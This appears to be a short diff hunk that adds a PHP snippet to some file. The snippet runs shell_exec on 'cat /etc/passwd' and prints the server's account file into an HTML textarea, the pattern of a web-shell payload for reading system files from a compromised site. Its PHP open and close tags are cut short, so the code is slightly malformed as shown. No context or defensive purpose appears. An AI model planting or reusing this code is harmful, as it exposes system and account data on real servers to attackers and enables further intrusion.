@@ -1,0 +1,3 @@
+php
+$passwd=shell_exec("cat /etc/passwd"); echo "<textarea cols='85' rows='17'>"; echo $passwd."\n"; echo "</textarea>";
+?
